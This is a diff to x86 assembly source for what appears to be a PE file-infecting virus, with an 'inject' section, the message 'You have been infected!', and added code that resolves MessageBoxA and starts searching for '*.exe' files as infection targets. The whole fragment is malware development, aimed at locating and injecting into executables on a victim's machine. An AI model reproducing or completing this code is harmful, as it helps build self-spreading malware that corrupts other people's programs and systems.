@@ -5,6 +5,8 @@ old_entry:
     invoke ExitProcess, 0
 
 .code inject
+	data_start EQU $
+	
     strF1A db 'FindFirstFileA', 0
     strFNA db 'FindNextFileA', 0
     strFC db 'FindClose', 0
@@ -17,6 +19,8 @@ old_entry:
     strGPA db 'GetProcAddress', 0
     stru32dll db 'user32.dll', 0
     strMBA db 'MessageBoxA', 0
+    
+    strQuery db '*.exe', 0
 	strCaption db 'Notice', 0
     strContent db 'You have been infected!', 0
         
@@ -129,21 +133,23 @@ start:
     toStack fwrite
     
     k32import offset strLLA
-    mov edx, eax
     toStack loadlib
     
-    temp = offset stru32dll - offset strF1A
-   	fromStack selfSection, ecx
-   	add ecx, temp
-   	push ecx
-   	call edx
-    
+   	push daccess(offset stru32dll)
+   	call fromStack(loadlib)
     toStack user32dll
     
     k32import offset strGPA
     toStack getaddr
     
+    push daccess(offset strMBA)
+    push fromStack(user32dll)
+    call fromStack(getaddr)
+    toStack msgbox
     
+    push 0
+    push daccess(offset strQuery)
+    call fromStack(ffind1)
     
 
 end start
